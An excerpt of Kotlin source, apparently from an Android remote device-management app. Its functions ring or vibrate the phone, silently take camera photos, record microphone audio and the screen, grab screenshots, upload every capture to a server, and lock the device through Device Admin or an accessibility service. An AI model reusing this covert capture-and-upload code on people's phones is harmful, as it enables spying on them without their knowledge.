   110→    fun vibrate(context: Context, params: Map<String, Any>): String {
   111→        return try {
   112→            val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
   113→            if (!vibrator.hasVibrator()) return "Device has no vibrator"
   114→            
   115→            val duration = ((params["arg"]?.toString()?.toLongOrNull() ?: 1000L)).coerceAtMost(5000)
   116→            val pattern = params["pattern"] as? List<Long>
   117→            
   118→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
   119→                val effect = if (pattern != null && pattern.isNotEmpty()) {
   120→                    VibrationEffect.createWaveform(pattern.toLongArray(), -1)
   121→                } else {
   122→                    VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE)
   123→                }
   124→                vibrator.vibrate(effect)
   125→            } else {
   126→                @Suppress("DEPRECATION")
   127→                if (pattern != null && pattern.isNotEmpty()) {
   128→                    vibrator.vibrate(pattern.toLongArray(), -1)
   129→                } else {
   130→                    vibrator.vibrate(duration)
   131→                }
   132→            }
   133→            "Vibrating for ${duration}ms"
   134→        } catch (e: Exception) {
   135→            Log.e(TAG, "Vibrate error", e)
   136→            "Error: ${e.message}"
   137→        }
   138→    }

   141→    fun ring(context: Context): String {
   142→        return try {
   143→            val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
   144→            am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0)
   145→            am.ringerMode = AudioManager.RINGER_MODE_NORMAL
   146→
   147→            val uri = Settings.System.DEFAULT_RINGTONE_URI
   148→            val player = android.media.MediaPlayer.create(context, uri)
   149→            player?.setAudioAttributes(
   150→                AudioAttributes.Builder()
   151→                    .setUsage(AudioAttributes.USAGE_NOTIFICATION_RINGTONE)
   152→                    .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
   153→                    .build()
   154→            )
   155→            player?.isLooping = true
   156→            player?.start()
   157→            player?.setOnCompletionListener { it.release() }
   158→            
   159→            // Auto-stop after 30 seconds
   160→            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
   161→                try { player?.stop(); player?.release() } catch (_: Exception) {}
   162→            }, 30000)
   163→            "Ringing..."
   164→        } catch (e: Exception) {
   165→            Log.e(TAG, "Ring error", e)
   166→            "Error: ${e.message}"
   167→        }

   198→    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
   199→    private fun captureScreenReal(context: Context, resultCode: Int, data: Intent): Map<String, Any> {
   200→        val latch = CountDownLatch(1)
   201→        var resultBitmap: Bitmap? = null
   202→        var error: String? = null
   203→        
   204→        try {
   205→            val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
   206→            val projection = mpm.getMediaProjection(resultCode, data)
   207→            
   208→            if (projection == null) {
   209→                return mapOf("error" to "Failed to create media projection")
   210→            }
   211→            
   212→            val metrics = context.resources.displayMetrics
   213→            val width = metrics.widthPixels
   214→            val height = metrics.heightPixels
   215→            val density = metrics.densityDpi
   216→            
   217→            val imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2)
   218→            
   219→            val virtualDisplay = projection.createVirtualDisplay(
   220→                "ScreenCapture",
   221→                width, height, density,
   222→                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
   223→                imageReader.surface, null, null
   224→            )
   225→            
   226→            imageReader.setOnImageAvailableListener({ reader ->
   227→                try {
   228→                    val image = reader.acquireLatestImage()
   229→                    if (image != null) {
   230→                        val planes = image.planes
   231→                        val buffer = planes[0].buffer
   232→                        val bytes = ByteArray(buffer.remaining())
   233→                        buffer.get(bytes)
   234→                        
   235→                        val bitmap = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
   236→                        if (bitmap != null) {
   237→                            resultBitmap = bitmap
   238→                        }
   239→                        image.close()
   240→                        latch.countDown()
   241→                    }
   242→                } catch (e: Exception) {
   243→                    error = e.message
   244→                    latch.countDown()
   245→                }
   246→            }, Handler(context.mainLooper))
   247→            
   248→            // Wait for capture
   249→            latch.await(5, TimeUnit.SECONDS)
   250→            
   251→            // Cleanup
   252→            virtualDisplay?.release()
   253→            imageReader?.close()
   254→            projection.stop()
   255→            
   256→            if (resultBitmap != null) {
   257→                // Convert to base64
   258→                val stream = ByteArrayOutputStream()
   259→                resultBitmap!!.compress(Bitmap.CompressFormat.JPEG, 80, stream)
   260→                val base64 = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT)
   261→                
   262→                // Save to file
   263→                val file = File(context.cacheDir, "screenshot_${System.currentTimeMillis()}.jpg")
   264→                FileOutputStream(file).use { it.write(stream.toByteArray()) }
   265→                
   266→                // Upload to server (file will be cached for streaming viewer)
   267→                CoroutineScope(Dispatchers.IO).launch {
   268→                    try {
   269→                        ApiClient.uploadFile(file, "screenshot")
   270→                    } catch (e: Exception) { Log.w(TAG, "Upload failed", e) }
   271→                }
   272→                
   273→                // Return full base64 for streaming viewer (server caches this)
   274→                return mapOf(
   275→                    "status" to "success",
   276→                    "message" to "Screenshot captured",
   277→                    "width" to resultBitmap!!.width,
   278→                    "height" to resultBitmap!!.height,
   279→                    "size" to stream.size(),
   280→                    "file" to file.name,
   281→                    "base64_preview" to base64
   282→                )
   283→            } else {
   284→                return mapOf("error" to (error ?: "Failed to capture screen"))
   285→            }
   286→        } catch (e: Exception) {
   287→            Log.e(TAG, "Screen capture error", e)
   288→            return mapOf("error" to (e.message ?: "Unknown error"))
   289→        }
   290→    }

   301→    private fun takePhotoReal(context: Context, facing: Int): Map<String, Any> {
   302→        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
   303→            return mapOf("error" to "Camera2 requires Android 5.0+")
   304→        }
   305→        
   306→        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
   307→            return mapOf(
   308→                "error" to "Camera permission not granted",
   309→                "permission_required" to "android.permission.CAMERA"
   310→            )
   311→        }
   312→        
   313→        val latch = CountDownLatch(1)
   314→        var resultBitmap: Bitmap? = null
   315→        var errorMessage: String? = null
   316→        var reader: ImageReader? = null
   317→        var thread: HandlerThread? = null
   318→        
   319→        try {
   320→            val manager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
   321→            var cameraId: String? = null
   322→            
   323→            // Find camera with correct facing
   324→            for (id in manager.cameraIdList) {
   325→                val characteristics = manager.getCameraCharacteristics(id)
   326→                val lensFacing = characteristics.get(CameraCharacteristics.LENS_FACING)
   327→                if (lensFacing == facing) {
   328→                    cameraId = id
   329→                    break
   330→                }
   331→            }
   332→            
   333→            if (cameraId == null) {
   334→                return mapOf("error" to "No ${if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"} camera found")
   335→            }
   336→            
   337→            // Setup handler thread
   338→            thread = HandlerThread("CameraThread").apply { start() }
   339→            val handler = Handler(thread!!.looper)
   340→            
   341→            // Get optimal size
   342→            val characteristics = manager.getCameraCharacteristics(cameraId)
   343→            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
   344→            val sizes = map?.getOutputSizes(ImageFormat.JPEG)
   345→            val size = sizes?.maxByOrNull { it.width * it.height }
   346→                ?: return mapOf("error" to "No supported JPEG sizes")
   347→            
   348→            // Create image reader
   349→            reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
   350→            
   351→            reader.setOnImageAvailableListener({ imageReader ->
   352→                try {
   353→                    val image = imageReader.acquireLatestImage()
   354→                    if (image != null) {
   355→                        val buffer = image.planes[0].buffer
   356→                        val bytes = ByteArray(buffer.remaining())
   357→                        buffer.get(bytes)
   358→                        
   359→                        val bitmap = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
   360→                        resultBitmap = bitmap
   361→                        
   362→                        // Save to file
   363→                        val file = File(context.cacheDir, "camera_${System.currentTimeMillis()}.jpg")
   364→                        FileOutputStream(file).use { it.write(bytes) }
   365→                        
   366→                        // Upload in background (with device_id for server identification)
   367→                        CoroutineScope(Dispatchers.IO).launch {
   368→                            try { ApiClient.uploadFile(file, "camera") } catch (e: Exception) { Log.w(TAG, "Upload failed", e) }
   369→                        }
   370→                        
   371→                        image.close()
   372→                    }
   373→                } catch (e: Exception) {
   374→                    errorMessage = e.message
   375→                }
   376→                latch.countDown()
   377→            }, handler)
   378→            
   379→            // Open camera
   380→            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
   381→                override fun onOpened(camera: CameraDevice) {
   382→                    try {
   383→                        val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
   384→                        captureRequest.addTarget(reader.surface)
   385→                        captureRequest.set(CaptureRequest.JPEG_ORIENTATION, 90)
   386→                        
   387→                        camera.createCaptureSession(
   388→                            listOf(reader.surface),
   389→                            object : CameraCaptureSession.StateCallback() {
   390→                                override fun onConfigured(session: CameraCaptureSession) {
   391→                                    session.capture(captureRequest.build(), null, handler)
   392→                                    
   393→                                    // Close after capture
   394→                                    handler.postDelayed({
   395→                                        camera.close()
   396→                                        reader?.close()
   397→                                        thread?.quitSafely()
   398→                                    }, 2000)
   399→                                }
   400→                                
   401→                                override fun onConfigureFailed(session: CameraCaptureSession) {
   402→                                    errorMessage = "Session configuration failed"
   403→                                    latch.countDown()
   404→                                }
   405→                            },
   406→                            handler
   407→                        )
   408→                    } catch (e: Exception) {
   409→                        errorMessage = e.message
   410→                        latch.countDown()
   411→                    }
   412→                }
   413→                
   414→                override fun onDisconnected(camera: CameraDevice) {
   415→                    camera.close()
   416→                }
   417→                
   418→                override fun onError(camera: CameraDevice, error: Int) {
   419→                    errorMessage = "Camera error: $error"
   420→                    camera.close()
   421→                    latch.countDown()
   422→                }
   423→            }, handler)
   424→            
   425→            // Wait for result with cleanup on timeout
   426→            val success = latch.await(10, TimeUnit.SECONDS)
   427→
   428→            if (resultBitmap != null) {
   429→                val stream = ByteArrayOutputStream()
   430→                resultBitmap!!.compress(Bitmap.CompressFormat.JPEG, 80, stream)
   431→                val base64 = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT)
   432→                
   433→                return mapOf(
   434→                    "status" to "success",
   435→                    "message" to "Photo captured from ${if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"} camera",
   436→                    "width" to resultBitmap!!.width,
   437→                    "height" to resultBitmap!!.height,
   438→                    "size" to stream.size(),
   439→                    "base64_preview" to base64
   440→                )
   441→            } else {
   442→                return mapOf("error" to (errorMessage ?: "Failed to capture photo"))
   443→            }
   444→        } catch (e: Exception) {
   445→            Log.e(TAG, "Camera capture error", e)
   446→            return mapOf("error" to (e.message ?: "Camera capture failed"))
   447→        } finally {
   448→            // Ensure resources are cleaned up even on timeout or error
   449→            try { reader?.close() } catch (_: Exception) {}
   450→            try { thread?.quitSafely() } catch (_: Exception) {}
   451→        }
   452→    }

   455→    fun startAudioRecording(context: Context, params: Map<String, Any>): Map<String, Any> {
   456→        return try {
   457→            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
   458→                return mapOf(
   459→                    "error" to "RECORD_AUDIO permission not granted",
   460→                    "permission_required" to "android.permission.RECORD_AUDIO"
   461→                )
   462→            }
   463→            
   464→            if (isRecordingAudio) {
   465→                return mapOf("error" to "Already recording audio")
   466→            }
   467→            
   468→            val duration = (params["duration"] as? Number)?.toInt() ?: 60
   469→            val sampleRate = 44100
   470→            val channelConfig = AudioFormat.CHANNEL_IN_MONO
   471→            val audioFormat = AudioFormat.ENCODING_PCM_16BIT
   472→            val bufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
   473→            
   474→            val audioFile = File(context.cacheDir, "audio_${System.currentTimeMillis()}.m4a")
   475→            audioRecordFile = audioFile
   476→            
   477→            // Use MediaRecorder for compressed audio
   478→            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
   479→                MediaRecorder(context)
   480→            } else {
   481→                @Suppress("DEPRECATION")
   482→                MediaRecorder()
   483→            }
   484→            
   485→            mediaRecorder?.apply {
   486→                setAudioSource(MediaRecorder.AudioSource.MIC)
   487→                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
   488→                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
   489→                setAudioSamplingRate(sampleRate)
   490→                setAudioEncodingBitRate(128000)
   491→                setOutputFile(audioFile.absolutePath)
   492→                prepare()
   493→                start()
   494→            }
   495→            
   496→            isRecordingAudio = true
   497→            
   498→            // Auto-stop after duration
   499→            CoroutineScope(Dispatchers.Main).launch {
   500→                kotlinx.coroutines.delay(duration * 1000L)
   501→                if (isRecordingAudio) {
   502→                    stopAudioRecording(context)
   503→                }
   504→            }
   505→            
   506→            mapOf(
   507→                "status" to "recording",
   508→                "message" to "Audio recording started",
   509→                "duration_seconds" to duration,
   510→                "file" to audioFile.name
   511→            )
   512→        } catch (e: Exception) {
   513→            Log.e(TAG, "Audio recording start error", e)
   514→            mapOf("error" to (e.message ?: "Failed to start audio recording"))
   515→        }
   516→    }

   518→    fun stopAudioRecording(context: Context): Map<String, Any> {
   519→        return try {
   520→            if (!isRecordingAudio) {
   521→                return mapOf("error" to "Not recording audio")
   522→            }
   523→            
   524→            mediaRecorder?.apply {
   525→                stop()
   526→                release()
   527→            }
   528→            mediaRecorder = null
   529→            isRecordingAudio = false
   530→            
   531→            val file = audioRecordFile
   532→            if (file != null && file.exists()) {
   533→                // Upload to server
   534→                CoroutineScope(Dispatchers.IO).launch {
   535→                    try { ApiClient.uploadFile(file, "audio") } catch (e: Exception) { Log.w(TAG, "Upload failed", e) }
   536→                }
   537→                
   538→                mapOf(
   539→                    "status" to "success",
   540→                    "message" to "Audio recording stopped",
   541→                    "file" to file.name,
   542→                    "size" to file.length()
   543→                )
   544→            } else {
   545→                mapOf("error" to "Audio file not found")
   546→            }
   547→        } catch (e: Exception) {
   548→            Log.e(TAG, "Audio recording stop error", e)
   549→            mapOf("error" to (e.message ?: "Failed to stop audio recording"))
   550→        }
   551→    }

   582→                "action" to "request_screen_capture"
   583→            )
   584→        }
   585→        
   586→        return try {
   587→            val duration = (params["duration"] as? Number)?.toInt() ?: 60
   588→            val metrics = context.resources.displayMetrics
   589→            val width = metrics.widthPixels
   590→            val height = metrics.heightPixels
   591→            val density = metrics.densityDpi
   592→            
   593→            val videoFile = File(context.cacheDir, "screen_${System.currentTimeMillis()}.mp4")
   594→            screenRecordFile = videoFile
   595→            
   596→            // Create media projection
   597→            val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
   598→            val projection = mpm.getMediaProjection(resultCode, data)
   599→            mediaProjection = projection
   600→            
   601→            // Setup recorder
   602→            screenRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
   603→                MediaRecorder(context)
   604→            } else {
   605→                @Suppress("DEPRECATION")
   606→                MediaRecorder()
   607→            }
   608→            
   609→            screenRecorder?.apply {
   610→                setVideoSource(MediaRecorder.VideoSource.SURFACE)
   611→                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
   612→                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
   613→                setVideoSize(width, height)
   614→                setVideoFrameRate(30)
   615→                setVideoEncodingBitRate(8 * 1000 * 1000) // 8 Mbps
   616→                setOutputFile(videoFile.absolutePath)
   617→                prepare()
   618→            }
   619→            
   620→            // Create virtual display
   621→            virtualDisplay = projection?.createVirtualDisplay(
   622→                "ScreenRecord",
   623→                width, height, density,
   624→                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
   625→                screenRecorder?.surface, null, null
   626→            )
   627→            
   628→            screenRecorder?.start()
   629→            isRecordingScreen = true
   630→            
   631→            // Auto-stop after duration
   632→            CoroutineScope(Dispatchers.Main).launch {
   633→                kotlinx.coroutines.delay(duration * 1000L)
   634→                if (isRecordingScreen) {
   635→                    stopScreenRecording(context)
   636→                }
   637→            }
   638→            
   639→            mapOf(
   640→                "status" to "recording",
   641→                "message" to "Screen recording started",
   642→                "duration_seconds" to duration,
   643→                "resolution" to "${width}x${height}",
   644→                "file" to videoFile.name
   645→            )
   646→        } catch (e: Exception) {
   647→            Log.e(TAG, "Screen recording start error", e)
   648→            mapOf("error" to (e.message ?: "Failed to start screen recording"))
   649→        }
   650→    }

   653→        if (!isRecordingScreen) {
   654→            return mapOf("error" to "Not recording screen")
   655→        }
   656→        
   657→        return try {
   658→            screenRecorder?.apply {
   659→                stop()
   660→                release()

   662→            screenRecorder = null

   664→            virtualDisplay?.release()
   665→            virtualDisplay = null
   666→            
   667→            mediaProjection?.stop()

   669→            
   670→            isRecordingScreen = false
   671→

   674→                // Upload to server

   677→                }
   678→                
   679→                mapOf(
   680→                    "status" to "success",
   681→                    "message" to "Screen recording stopped",
   682→                    "file" to file.name,
   683→                    "size" to file.length()
   684→                )
   685→            } else {
   686→                mapOf("error" to "Video file not found")
   687→            }
   688→        } catch (e: Exception) {
   689→            Log.e(TAG, "Screen recording stop error", e)

  1198→    fun lockPhone(context: Context): String {
  1199→        return try {
  1200→            val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
  1201→            
  1202→            // Try Device Admin first
  1203→            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
  1204→            val adminComponent = android.content.ComponentName(context, "com.abuzahra.manager.service.DeviceAdminReceiver")
  1205→            
  1206→            if (dpm.isAdminActive(adminComponent)) {
  1207→                dpm.lockNow()
  1208→                return "Phone locked"
  1209→            }
  1210→            
  1211→            // Fallback: try accessibility service
  1212→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
  1213→                val accessibility = MyAccessibilityService.getInstance()
  1214→                if (accessibility != null) {
  1215→                    accessibility.lockScreen()
  1216→                    return "Phone locked via accessibility"
  1217→                }
  1218→            }
  1219→            
  1220→            // Wake then lock
  1221→            @Suppress("DEPRECATION")
  1222→            val wakeLockFlags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
  1223→                android.os.PowerManager.PARTIAL_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP
  1224→            } else {
  1225→                @Suppress("DEPRECATION")
  1226→                android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP
  1227→            }
  1228→            val wl = pm.newWakeLock(wakeLockFlags, "abuzahra:lock")
  1229→            wl.acquire(100)
  1230→            wl.release()
  1231→            
  1232→            "Phone lock requires Device Admin or Accessibility service"
  1233→        } catch (e: Exception) {
  1234→            Log.e(TAG, "Lock phone error", e)
  1235→            "Error: ${e.message} - Device Admin may not be active"
  1236→        }
  1237→    }
